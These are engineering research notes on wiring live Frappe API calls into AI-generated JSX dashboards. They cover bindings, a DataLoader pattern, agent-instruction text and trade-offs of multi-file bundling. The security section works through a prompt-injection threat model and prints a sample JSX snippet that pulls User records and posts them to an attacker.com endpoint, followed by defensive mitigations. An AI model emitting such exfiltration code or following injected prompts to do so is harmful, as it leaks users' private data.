# JSX Preview + Frappe Integration — Research Notes

**Date**: 2026-02-18
**Branch**: `claude/jsx-frappe-integration-research-WWeIC`
**Context**: The HUF chat UI can already generate and render AI-produced JSX dashboards and charts using `react-jsx-parser`. This document explores how far that system can go — specifically around live Frappe API calls, passing custom functions to the LLM, security, and multi-file component support.

---

## 1. Can the Current JSX Preview Allow Frappe API Calls?

### How the preview works today

The JSX preview system (`frontend/src/components/ui/jsx-preview.tsx`) uses **`react-jsx-parser`** (v2.4.1) to parse and render LLM-generated JSX strings at runtime in the browser. It does **not** use Babel standalone, Sucrase, or esbuild — it is a pure string parser that maps JSX tags to pre-registered React component references.

Two things control what the generated JSX can access:

| Prop | Purpose |
|---|---|
| `components` | Which React components the JSX can use (Recharts, shadcn/ui, Lucide icons, etc.) |
| `bindings` | JavaScript values/functions the JSX can reference as variables |

The current `defaultBindings` (lines 320–375 in `jsx-preview.tsx`) expose only:

- `Math`, `JSON`, `Array`, `Object`, `console`
- Number/date/string formatters
- Array helpers (`sum`, `avg`, `groupBy`, `sortBy`, etc.)
- `COLORS` array

**There is no Frappe SDK object, no `call`, no `db`, and no `frappe` in the default bindings.**

### Can it work technically?

**Yes — the plumbing is already there.** Because the JSX preview renders inside the same browser context as the main Huf React app:

- The user's Frappe session cookie is present.
- The same origin policy is satisfied.
- `frappe-js-sdk` (`frontend/src/lib/frappe-sdk.ts`) exports `call`, `db`, and `frappe` that are already authenticated and pointed at the correct Frappe instance.

The `JSXPreviewContent` component accepts a `bindings` prop that is merged with `defaultBindings`:

```tsx
// jsx-preview.tsx:477-490
<JsxParser
  jsx={processedJsx}
  components={{ ...availableComponents, ...components }}
  bindings={{ ...defaultBindings, ...bindings }}   // ← custom bindings merge here
  ...
/>
```

And `JSXPreview` (the outer provider) passes through:

```tsx
export interface JSXPreviewProps {
  bindings?: Record<string, unknown>;  // ← already in the public API
  ...
}
```

So to enable Frappe calls you only need to pass the API objects in:

```tsx
import { call, db } from '@/lib/frappe-sdk';

<JSXPreview
  jsx={llmGeneratedJsx}
  bindings={{
    frappeCall: call,
    frappeDb: db,
  }}
/>
```

The LLM can then generate JSX that calls:
```jsx
// LLM-generated JSX example
<Button onClick={() => frappeCall.get('huf.ai.agent_integration.run_agent_sync', { agent_name: 'my-agent', prompt: 'Hello' })}>
  Run Agent
</Button>
```

### Can you prompt the LLM to do this right now?

**Not reliably, without changes.** Here is why:

- The LLM has no way to discover what is in `bindings` unless it is told in the agent's system prompt (the `instructions` field of the `Agent` DocType).
- If you manually type a prompt like *"Generate a JSX dashboard that fetches Sales Orders from Frappe using `frappeDb.getDocList`"*, the LLM will produce syntactically plausible JSX — but at render time, `frappeDb` will be `undefined` and it will silently fail or throw.
- `react-jsx-parser` does not propagate async errors well; the `renderError` callback only receives synchronous parse errors, not runtime Promise rejections.

### What is needed to make it work end-to-end

1. **Pass Frappe API objects in `bindings`** when rendering JSX artifacts (`ArtifactRenderer.tsx`, `JSXPreviewRenderer.tsx`, `PreviewViewPage.tsx`).
2. **Update agent instructions** to document the available binding names and their APIs so the LLM generates correct calls.
3. **Handle async rendering** — the JSX can call `frappeDb.getDocList()` in an `onClick`, but rendering data fetched on mount requires using a wrapper component that manages `useState`/`useEffect`. `react-jsx-parser` does support JSX expressions, but complex hook-style logic inside JSX strings is fragile. A better pattern is described in section 2 below.

---

## 2. Good Pattern for Passing Custom Functions to the LLM

### The core challenge

The LLM generates a static JSX string. The string is parsed by `react-jsx-parser` and rendered as React elements. The parser cannot run `import` statements or define new hooks — it only evaluates the JSX tree using what is in `bindings`. This means **all dynamic behaviour must come from functions passed as bindings**.

### Recommended pattern: Curated API surface + documented contracts

#### Step 1 — Define a typed helper object

Create a dedicated module (e.g., `frontend/src/lib/jsx-frappe-api.ts`) that wraps the raw Frappe SDK in simple, predictable async functions:

```typescript
// frontend/src/lib/jsx-frappe-api.ts
import { call, db } from '@/lib/frappe-sdk';

export const jsxFrappeApi = {
  // List documents with optional filters
  getList: (doctype: string, filters?: object, fields?: string[], limit = 20) =>
    db.getDocList(doctype, { filters, fields, limit }),

  // Get a single document
  getDoc: (doctype: string, name: string) =>
    db.getDoc(doctype, name),

  // Call a whitelisted Python method
  callMethod: (method: string, args?: object) =>
    call.get(method, args),

  // Simple GET value
  getValue: (doctype: string, name: string, fieldname: string) =>
    db.getValue(doctype, name, fieldname),
};
```

#### Step 2 — Pass it as a single binding

```tsx
import { jsxFrappeApi } from '@/lib/jsx-frappe-api';

<JSXPreview
  jsx={artifact.content}
  bindings={{ frappe: jsxFrappeApi }}
/>
```

#### Step 3 — Document the surface in agent instructions

In the Agent DocType's `instructions` field, add a section that the LLM reads at runtime. Keep it concise:

```
## JSX Environment — Available APIs

When generating <artifact type="jsx"> content you have access to a `frappe` binding:

- frappe.getList(doctype, filters?, fields?, limit?)  → Promise<object[]>
- frappe.getDoc(doctype, name)                        → Promise<object>
- frappe.callMethod(method, args?)                    → Promise<any>
- frappe.getValue(doctype, name, fieldname)           → Promise<any>

**IMPORTANT**: These return Promises. To display async data use the DataLoader pattern below.

## DataLoader pattern (use this for fetching on mount)

The `DataLoader` component is pre-registered and handles async state for you:

<DataLoader load={() => frappe.getList('Sales Order', {status: 'Submitted'}, ['name','grand_total'], 10)}>
  {(data) => (
    <BarChart ...>...</BarChart>
  )}
</DataLoader>
```

#### Step 4 — Register a `DataLoader` component

Add a generic data-fetching wrapper to `availableComponents` so the LLM can use it without needing `useState`/`useEffect` syntax:

```tsx
// Add to availableComponents in jsx-preview.tsx
DataLoader: ({ load, children, fallback }: {
  load: () => Promise<unknown>;
  children: (data: unknown) => ReactNode;
  fallback?: ReactNode;
}) => {
  const [data, setData] = useState<unknown>(null);
  const [loading, setLoading] = useState(true);
  useEffect(() => {
    load().then((d) => { setData(d); setLoading(false); });
  }, []);
  if (loading) return <>{fallback ?? <Skeleton className="h-32 w-full" />}</>;
  return <>{children(data)}</>;
},
```

This keeps the LLM's JSX declarative (no hooks, no `async/await` syntax in JSX) and avoids complex error-prone patterns.

#### Summary of the pattern

```
┌─────────────────────────────────────────────────┐
│  Agent Instructions  (system prompt)            │
│  Documents: frappe.getList(), DataLoader, etc.  │
└────────────────────┬────────────────────────────┘
                     │ LLM reads → generates JSX
                     ▼
┌─────────────────────────────────────────────────┐
│  <artifact type="jsx">                          │
│    <DataLoader load={() => frappe.getList(...)}>│
│      {(data) => <BarChart data={data} .../>}    │
│    </DataLoader>                                │
│  </artifact>                                    │
└────────────────────┬────────────────────────────┘
                     │ parsed by react-jsx-parser
                     ▼
┌─────────────────────────────────────────────────┐
│  JSXPreview bindings = { frappe: jsxFrappeApi } │
│  components = { ..., DataLoader }               │
│  → Renders live dashboard with Frappe data      │
└─────────────────────────────────────────────────┘
```

---

## 3. Security Considerations

Allowing LLM-generated code to make authenticated Frappe API calls is a meaningful increase in attack surface. Here are the key risks and mitigations:

### 3.1 LLM prompt injection → data exfiltration

**Risk**: A malicious user crafts a prompt that causes the LLM to generate JSX which silently reads sensitive DocType data and sends it to an external server.

```jsx
{/* Malicious LLM-generated JSX */}
<DataLoader load={() => frappe.getList('User', {}, ['name','email'], 500)}>
  {(data) => {
    fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
    return <div>Loading...</div>;
  }}
</DataLoader>
```

**Mitigations**:
- **Do not expose raw `fetch` or `XMLHttpRequest` in bindings.** The current `defaultBindings` do not include these, but `window` is accessible in the browser context. `react-jsx-parser` doesn't sandbox `window` access — however JSX expressions using bare identifiers like `fetch` are only resolved through `bindings`, not through the global scope (the parser replaces identifier references with binding lookups). Verify this behaviour with your version of `react-jsx-parser`.
- **Whitelist allowed DocTypes** in `jsxFrappeApi.getList`. Reject DocTypes outside an allowed set (e.g., only operational data DocTypes, never `User`, `AI Provider`, or `Agent`).
- **Apply Frappe permission layer**: Frappe's `db.getDocList` respects row-level permissions. The user cannot fetch data they don't have permission for — this is a strong built-in control.
- **Content Security Policy (CSP)**: Set a strict CSP header on the Frappe site to block requests to external origins: `connect-src 'self'`. This blocks `fetch` to external domains even if the JSX manages to call it.

### 3.2 CSRF — accidental write operations

**Risk**: If write-capable methods (`frappe.createDoc`, `frappe.updateDoc`, `frappe.deleteDoc`) are exposed in bindings, the LLM could generate JSX that modifies data on render, not just on user action.

**Mitigation**:
- **Read-only by default**: Expose only read methods (`getList`, `getDoc`, `getValue`, `callMethod`) in the default `jsxFrappeApi`. Keep write methods behind a separate opt-in binding (e.g., `frappeWrite`) that is only passed to trusted agent contexts.
- Frappe's whitelisted methods require `frappe.whitelist()` — they already carry CSRF tokens via the SDK. This doesn't prevent misuse, but it does log the calls.

### 3.3 Cross-site scripting (XSS)

**Risk**: LLM-generated JSX contains `dangerouslySetInnerHTML` or inline event handlers that execute attacker-controlled scripts.

**Mitigation**:
- `react-jsx-parser` with `allowUnknownElements={false}` (already set in `jsx-preview.tsx:487`) rejects any HTML tag not in `availableComponents`. Since `script`, `iframe`, `object`, etc. are not registered, they will not render.
- `dangerouslySetInnerHTML` is a React prop, not a tag — `react-jsx-parser` may allow it as a prop on registered components. Audit whether any registered component accepts and passes through `dangerouslySetInnerHTML`. None of the current Recharts/shadcn components do.
- The `console` binding in `defaultBindings` is low risk (read-only output) but could be removed if strict.

### 3.4 Rate limiting and cost

**Risk**: LLM generates JSX that calls `frappe.callMethod` in a tight loop or on every render, hammering the backend.

**Mitigation**:
- Add debouncing/throttling inside `jsxFrappeApi` wrapper functions.
- Detect and reject calls made outside of user interactions (hard to enforce, but `DataLoader` pattern using `useEffect` with `[]` dependency is single-shot).
- Frappe's rate limiter (if configured) will apply to the API calls regardless.

### 3.5 Sensitive field exposure

**Risk**: The LLM requests fields containing API keys, passwords, or PII.

**Mitigation**:
- Frappe's `Password` field type redacts values in API responses — `api_key` in `AI Provider` is never returned by `getDoc`.
- Consider adding a field-level blocklist in `jsxFrappeApi.getList` that strips known sensitive fieldnames from the `fields` parameter.

### Security summary table

| Risk | Severity | Current Status | Recommended Mitigation |
|---|---|---|---|
| Data exfiltration via fetch | High | Not exposed in bindings by default | CSP `connect-src 'self'`, doctype allowlist |
| Write operations on render | Medium | Not exposed by default | Read-only bindings surface |
| XSS via dangerouslySetInnerHTML | Low | `allowUnknownElements=false` helps | Audit component props |
| Rate limit abuse | Low | No current protection | Debounce in wrapper |
| Sensitive field exposure | Medium | Frappe redacts Password fields | Field blocklist in wrapper |

---

## 4. Can JSX Preview Support Multiple Files (Like a Real React App)?

### Current limitation

`react-jsx-parser` takes a **single JSX string** and resolves all component names against the flat `availableComponents` registry and `bindings` map. It has no concept of:

- ES module `import` statements
- A virtual file system
- Inter-component dependency graphs

This means you **cannot** write:

```jsx
{/* This will fail — react-jsx-parser cannot resolve imports */}
import { MySubChart } from './MySubChart';
<MySubChart data={salesData} />
```

Any attempt to use `import` syntax will either be silently ignored or cause a parse error.

### Why this is a hard constraint

`react-jsx-parser` is not a JavaScript bundler or transpiler. It is a JSX-to-`React.createElement` converter that works purely on the string it receives. There is no module resolution step.

### What you can do today (no changes needed)

**Register sub-components inside the JSX string itself using `availableComponents`.** Since `availableComponents` is a static registry, you can pre-populate it with reusable "building blocks" that the LLM assembles. The LLM just needs to know what names are available — documented in agent instructions.

The current registry already has 100+ components (Recharts primitives, shadcn/ui, Lucide icons). This is sufficient for most dashboard compositions.

### Option A — Compound JSX in a single string

The LLM writes all logic in a single JSX tree. This is the recommended path for now:

```jsx
<Card>
  <CardHeader><CardTitle>Q1 Sales</CardTitle></CardHeader>
  <CardContent>
    <DataLoader load={() => frappe.getList('Sales Order', ...)}>
      {(orders) => (
        <ResponsiveContainer width="100%" height={300}>
          <BarChart data={orders}>
            <XAxis dataKey="name" />
            <YAxis />
            <Bar dataKey="grand_total" fill="#8884d8" />
          </BarChart>
        </ResponsiveContainer>
      )}
    </DataLoader>
  </CardContent>
</Card>
```

This works today, without changes.

### Option B — Multiple `<artifact>` blocks, rendered separately

The artifact parser (`frontend/src/utils/artifactParser.ts`) already supports multiple `<artifact>` tags in a single message. Each is rendered as a separate `JSXPreview` instance. This is a form of "multi-component" output — each artifact is independently isolated.

### Option C — Runtime bundling with Babel standalone (significant change)

To support true multi-file JSX with `import` statements, you would need to replace `react-jsx-parser` with a runtime bundling approach:

1. **Babel standalone** (`@babel/standalone`) to transpile JSX + ES modules to CommonJS.
2. **A virtual module registry** — a `Map<string, string>` where each key is a fake module path and the value is the raw source code. The LLM generates multiple code blocks (one per file).
3. A **custom `require()` function** passed as a binding that resolves imports against the virtual registry.
4. Use `new Function(...)` or `eval()` to execute the transpiled entry point.

This approach would support:

```
File 1: components/SalesChart.jsx
File 2: components/KPICard.jsx
File 3: Dashboard.jsx (imports the above)
```

**Trade-offs**:

| Aspect | react-jsx-parser (current) | Babel standalone (new) |
|---|---|---|
| Bundle size | ~20 KB | ~800 KB+ (Babel) |
| Security | No `eval`, sandboxed component list | `eval`-based, full JS execution |
| Capability | Single-file JSX, no imports | Full React app with imports |
| Streaming support | Built-in (completeJsx) | Requires re-transpile on each chunk |
| Implementation effort | None (already working) | High |

For the use case of AI-generated dashboards, Option A (single compound JSX string) covers the vast majority of scenarios without the security and complexity cost of Babel standalone.

### Recommendation on multi-file

**Do not pursue multi-file support in the short term.** The single-string JSX approach with a rich `availableComponents` registry and the `DataLoader`/`frappe` binding pattern covers live-data dashboards completely. The benefit of multi-file (code organisation for the LLM) is outweighed by the security regression of introducing `eval`-based execution.

If multi-file is truly needed in future, scope it to a separate sandboxed `<iframe>` renderer that runs the Babel-compiled code in a completely isolated browsing context with no access to the parent app's cookies or auth.

---

## Implementation Checklist (If Pursuing Frappe Integration)

- [ ] Create `frontend/src/lib/jsx-frappe-api.ts` with read-only curated methods
- [ ] Add `DataLoader` component to `availableComponents` in `jsx-preview.tsx`
- [ ] Pass `frappe: jsxFrappeApi` bindings in `ArtifactRenderer.tsx` (jsx/chart case)
- [ ] Pass same bindings in `JSXPreviewRenderer.tsx` and `PreviewViewPage.tsx`
- [ ] Add doctype allowlist in `jsxFrappeApi.getList`
- [ ] Set CSP `connect-src 'self'` on the Frappe site
- [ ] Update agent `instructions` template to document available bindings
- [ ] Confirm `react-jsx-parser` does not resolve bare `fetch`/`window` identifiers through global scope (write a test case)
